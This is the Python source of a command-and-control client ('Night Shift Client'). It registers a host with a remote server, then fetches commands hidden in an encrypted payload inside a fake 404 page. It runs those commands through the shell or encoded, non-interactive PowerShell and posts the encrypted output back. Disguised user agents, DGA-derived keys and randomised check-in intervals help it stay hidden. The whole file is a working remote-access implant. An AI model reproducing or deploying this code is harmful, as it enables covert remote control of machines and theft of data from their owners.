#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Night Shift Client

import aiohttp
import asyncio
import base64
import json
import os
import re
import socket
import string
import subprocess
import sys
import time
from colorama import Fore, Back, Style
from datetime import datetime
from random import randrange
from subprocess import (PIPE, Popen)
from nightshift_utility import NightShift_Cipher, NightShift_DGA

class NightShift_Init_Check():

    def ns_init_check(self):
        if os.name == 'posix':
            ns_clnt_conf_path = './conf/ns_c_config.json'
            ns_clnt_init_path = './conf/ns_init_call.json'
        elif os.name == 'nt':
            ns_clnt_conf_path = 'conf\\ns_c_config.json'
            ns_clnt_init_path = 'conf\\ns_init_call.json'
        else:
            print('OS unknown and config file cannot be aquired client exiting')
            sys.exit(1)
        if os.path.exists(ns_clnt_conf_path):
            with open(ns_clnt_conf_path) as ns_conf_f:
                ns_client_conf = json.load(ns_conf_f)
                ns_init_url = ns_client_conf.get('ns_init_site')
                ns_initp_url = ns_client_conf.get('ns_init_site_p')
                ns_fof_url = ns_client_conf.get('ns_fof_site')
                ns_post_url = ns_client_conf.get('ns_post_site')
                ns_get_ua_str = ns_client_conf.get('ns_get_ua')
                ns_pst_ua_str = ns_client_conf.get('ns_post_ua')
        else:
            print('Config file does not exist and client cannot continue')
            sys.exit(1)
        if os.path.exists(ns_clnt_init_path):
            with open(ns_clnt_init_path) as ns_init_f:
                ns_init_data = json.load(ns_init_f)
                ns_host_hash = ns_init_data.get('host_hash')
                ns_host_data = ns_init_data.get('host_data')
                ns_host_init = ns_host_data.get('ns_init')
                ns_host_os = ns_host_data.get('os_type')
                ns_host_name = ns_host_data.get('host_name')
            if ns_host_init == True:
                ns_client_config = list((ns_host_init, ns_host_hash, ns_host_os, ns_host_name, ns_fof_url, ns_post_url, ns_get_ua_str, ns_pst_ua_str))
            elif ns_host_init == False:
                response = self.ns_init_call_loop(ns_clnt_init_path,ns_get_ua_str,ns_pst_ua_str,ns_init_url,ns_initp_url)
                ns_client_config = list((response[0], response[1], response[2], response[3], ns_fof_url, ns_post_url, ns_get_ua_str, ns_pst_ua_str))
        else:
            response = self.ns_init_call_loop(ns_clnt_init_path,ns_get_ua_str,ns_pst_ua_str,ns_init_url,ns_initp_url)
            ns_client_config = list((response[0], response[1], response[2], response[3], ns_fof_url, ns_post_url, ns_get_ua_str, ns_pst_ua_str))
        return ns_client_config
        
    def ns_init_call_loop(self,ns_clnt_init_path,ns_get_ua_str,ns_pst_ua_str,ns_init_url,ns_initp_url):
        s_cnt = 1
        l_cnt = 1
        nap_time = 10800
        ns_host_init = False
        loop = asyncio.get_event_loop()
        while ns_host_init == False:
            response = loop.run_until_complete(self.ns_init_call(ns_clnt_init_path,ns_get_ua_str,ns_pst_ua_str,ns_init_url,ns_initp_url))
            ns_host_init = response[0]
            ns_host_os_hashed = response[1]
            ns_os_type = response[2]
            ns_host_name = response[3]
            if ns_host_init == True:
                nap_time = 0
            elif l_cnt == 17:
                print('[+] {0} --> Connection to NightShift Server unsuccessful, shutting down.'.format(str(datetime.now())))
                sys.exit(1)
            elif s_cnt <= 4:
                nap_time = 10800
                print('[+] {0} --> Connection to NightShift Server failed. Attempt - {1} - Sleep set to {2} seconds.'.format(str(datetime.now()),str(s_cnt),str(nap_time)))
            elif s_cnt > 4:
                s_cnt = 1
                nap_time = 86400
                print('[+] {0} --> Connection to NightShift Server failed. Attempt -  {1} - increasing sleep. Sleep set to {2} seconds'.format(str(datetime.now()),str(l_cnt),str(nap_time)))
            s_cnt += 1
            l_cnt += 1
            time.sleep(nap_time)
        ns_client_config = list((ns_host_init, ns_host_os_hashed, ns_os_type, ns_host_name))
        return ns_client_config

    async def ns_init_call(self,ns_init_json_path,ns_getua_data,ns_postua_data,ns_initsite_data,ns_initsitep_data):
        ns_get_key = NightShift_DGA()
        ns_get_cipher = NightShift_Cipher()
        # Host Info
        ns_host_name_f = socket.gethostname()
        ns_os_type_f =  os.name
        ns_host_os_to_hash = str(ns_host_name_f + ns_os_type_f)
        ns_host_os_hashed_f = ns_get_cipher.hash_keys_hosts(ns_host_os_to_hash)
        # Server Contact Info
        ns_comms_chk_url = ns_initsite_data
        ns_post_url = ns_initsitep_data
        ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
        ns_hash_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
        ns_comms_hdr = {
                'User-Agent': ns_getua_data,
                'ETag': ns_hash_key
                }
        ns_post_hdr = {
                'User-Agent': ns_postua_data,
                'ETag': ns_hash_key
                }
        try:
            async with aiohttp.ClientSession(trust_env=True) as session:
                async with session.get(ns_comms_chk_url, headers=ns_comms_hdr) as response:
                    ns_comms_html = await response.text()
                if ns_comms_html == 'Test Sucessful':
                    ns_init_f = True
                    ns_init_config_f = { "host_data": { "os_type": ns_os_type_f, "host_name": ns_host_name_f, "ns_init": ns_init_f }, "host_hash": ns_host_os_hashed_f }
                    ns_post_data = ns_get_cipher.encrypt(str(ns_init_config_f))
                    async with session.post(ns_post_url, headers=ns_post_hdr, data=ns_post_data) as response:
                        ns_post_init_html = await response.text()
                else:
                    ns_init_f = False
                    ns_init_config_f = { "host_data": { "os_type": ns_os_type_f, "host_name": ns_host_name_f, "ns_init": ns_init_f }, "host_hash": ns_host_os_hashed_f }
                with open(ns_init_json_path, 'w') as ns_init_w:
                    json.dump(ns_init_config_f, ns_init_w)
        except aiohttp.client_exceptions.ClientConnectorError:
            ns_init_f = False
            print('[+] {0} --> NightShift Server connection to configured port is unavailable.'.format(str(datetime.now())), file=sys.stderr)
        response = list((ns_init_f, ns_host_os_hashed_f, ns_os_type_f, ns_host_name_f))
        return response

class NightShift_Client():
     
    async def FourOFour(self,ns_get_ua,ns_fof_url):

        async with aiohttp.ClientSession() as session:
            ns_url = ns_fof_url
            ns_get_key = NightShift_DGA()
            ns_get_cipher = NightShift_Cipher()
            ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
            ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
            ns_hdrs = {
                    'User-Agent': ns_get_ua,
                    'ETag': ns_hsh_key
                     }
            try:
                async with session.get(ns_url, headers=ns_hdrs) as response:
                    ns_fof_html = await response.text()
            except Exception as e:
                ns_fof_html = str(e)
            return ns_fof_html

    async def PostData(self,ns_post_data,ns_post_ua,ns_post_url):

        async with aiohttp.ClientSession() as session:
            ns_url = ns_post_url
            ns_get_key = NightShift_DGA()
            ns_get_cipher = NightShift_Cipher()
            ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
            ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
            ns_hdrs = {
                    'User-Agent': ns_post_ua,
                    'ETag': ns_hsh_key
                     }
            try:
                async with session.post(ns_url, headers=ns_hdrs, data=ns_post_data) as response:
                    ns_post_resp = await response.text()
            except Exception as e:
                ns_post_resp = str(e)
            return ns_post_resp

    def os_posix(self, ns_host_os_cmd_fof):
        time_stamp = datetime.now()
        output = subprocess.check_output(ns_host_os_cmd_fof, shell=True).decode('ascii')
        output_b64 = base64.b64encode(bytes(output, 'utf-8')).decode('ascii')
        return time_stamp, output_b64

    def os_winnt(self, ns_host_os_cmd_fof):
        time_stamp = datetime.now()
        ns_ps_cmd = 'powershell -nop -noni -enc "' + ns_host_os_cmd_fof + '"'
        #ns_ps_cmd = 'powershell -nop -win hidden -noni -enc "' + base64.b64encode(ns_host_os_cmd_fof.encode('utf_16_le')).decode('utf-8') + '"'
        output = (Popen(ns_ps_cmd, stdout=PIPE, shell=True).stdout.read())
        output_b64 = base64.b64encode(bytes(output, 'utf-8')).decode('ascii')
        return time_stamp, output_b64

if __name__ == "__main__":
    print(Fore.GREEN + r"""
    ╔═╗─╔╗───╔╗─╔╗╔═══╦╗───╔═╦╗──╔══╗─────────────────╔╗╔╗─────╔═╗╔═╗──╔╗──────╔╗─╔╗─╔═══╗╔╗
    ║║╚╗║║───║║╔╝╚╣╔═╗║║───║╔╝╚╗─║╔╗║────────────────╔╝╚╣║─────║║╚╝║║──║║──────║║╔╝╚╗║╔═╗║║║
    ║╔╗╚╝╠╦══╣╚╩╗╔╣╚══╣╚═╦╦╝╚╗╔╬╗║╚╝╚╦╗╔╦═╦═╗╔╦═╗╔══╗╚╗╔╣╚═╦══╗║╔╗╔╗╠╦═╝╠═╗╔╦══╣╚╩╗╔╝║║─║╠╣║
    ║║╚╗║╠╣╔╗║╔╗║║╚══╗║╔╗╠╬╗╔╣║╚╝║╔═╗║║║║╔╣╔╗╬╣╔╗╣╔╗║─║║║╔╗║║═╣║║║║║╠╣╔╗║╔╗╬╣╔╗║╔╗║║─║║─║╠╣║
    ║║─║║║║╚╝║║║║╚╣╚═╝║║║║║║║║╚╦╗║╚═╝║╚╝║║║║║║║║║║╚╝║─║╚╣║║║║═╣║║║║║║║╚╝║║║║║╚╝║║║║╚╗║╚═╝║║╚╗
    ╚╝─╚═╩╩═╗╠╝╚╩═╩═══╩╝╚╩╝╚╝╚═╩╝╚═══╩══╩╝╚╝╚╩╩╝╚╩═╗║─╚═╩╝╚╩══╝╚╝╚╝╚╩╩══╩╝╚╩╩═╗╠╝╚╩═╝╚═══╩╩═╝
    ──────╔═╝║───────────────────────────────────╔═╝║───────────────────────╔═╝║ Client
    ──────╚══╝───────────────────────────────────╚══╝───────────────────────╚══╝ version 0.9
            """)
    ns_get_cipher = NightShift_Cipher()
    ns_client = NightShift_Client()
    ns_init_chkr = NightShift_Init_Check().ns_init_check()
    ns_initchk_tf = ns_init_chkr[0]
    ns_host_hash = ns_init_chkr[1]
    ns_host_os = ns_init_chkr[2]
    ns_host_name = ns_init_chkr[3]
    ns_fof_url = ns_init_chkr[4]
    ns_post_url = ns_init_chkr[5]
    ns_get_ua = ns_init_chkr[6]
    ns_post_ua = ns_init_chkr[7]
    loop = asyncio.get_event_loop()
    while True:
        try:
            ns_fof_html = loop.run_until_complete(ns_client.FourOFour(ns_get_ua,ns_fof_url))
            if re.search(r'HTMLDOC', ns_fof_html):
                ns_payload = ((ns_fof_html.split('HTMLDOC:'))[1].split('HTMLDOC')[0])
                ns_decrypt_payload = ns_get_cipher.decrypt(ns_payload)
                ns_json_payload = json.loads(ns_decrypt_payload)
                ns_host_fof = ns_json_payload['host_404']
                ns_host_os_fof = ns_json_payload['host_os_404']
                ns_host_os_cmd_fof = ns_json_payload['host_cmd_404']
                ns_host_slpstate_fof = ns_json_payload['host_slpstate_404']
                if (ns_host_fof == 'ALL' and ns_host_os_fof == 'posix' and ns_host_os_fof == ns_host_os):
                    ns_get_output = ns_client.os_posix(ns_host_os_cmd_fof)
                elif (ns_host_fof == ns_host_hash and ns_host_os_fof == 'posix' and ns_host_os_fof == ns_host_os):
                    ns_get_output = ns_client.os_posix(ns_host_os_cmd_fof)
                elif (ns_host_fof == 'ALL' and ns_host_os_fof == 'nt' and ns_host_os_fof == ns_host_os):
                    ns_get_output = ns_client.os_winnt(ns_host_os_cmd_fof)
                elif (ns_host_fof == ns_host_hash and ns_host_os_fof == 'nt' and ns_host_os_fof == ns_host_os):
                    ns_get_output = ns_client.os_winnt(ns_host_os_cmd_fof)
                else:
                    ns_get_output = 'Command from NightShift Server is not for this OS/Host. Sleep State set for 30 minutes.'
            else:
                ns_get_output = 'Connection to NightShift Server has failed. Sleep State set for 30 minutes.'
            if re.search(r'Sleep State set for 30 minutes', str(ns_get_output)):
                ns_data_post_resp = ns_get_output
                ns_ss_sec = 1800
            else:
                ns_json_cmd_output = { 'time': str(ns_get_output[0]),'ns_host_hash': ns_host_hash, 'ns_host_type': ns_host_os, 'ns_cmd_ran': ns_host_os_cmd_fof, 'ns_cmd_output': ns_get_output[1] }
                ns_post_data = ns_get_cipher.encrypt(str(ns_json_cmd_output))
                ns_data_post_resp = loop.run_until_complete(ns_client.PostData(ns_post_data,ns_post_ua,ns_post_url))
                if ns_host_slpstate_fof >= 1:
                    ns_ss_sec = 60 * ns_host_slpstate_fof                
                elif ns_host_slpstate_fof == 0:
                    ns_rand_num = randrange(1, 120)
                    ns_ss_sec = 60 * ns_rand_num
                else:
                    ns_ss_sec = 1800
        except Exception as e:
            print(e)
            pass
        print('[+] {0:s} --> Response from NightShift Server --> {1:s} --> NightShift Client\'s next check-in in --> {2:s} seconds.'.format(str(datetime.now()),ns_data_post_resp,str(ns_ss_sec)))
        time.sleep(ns_ss_sec)
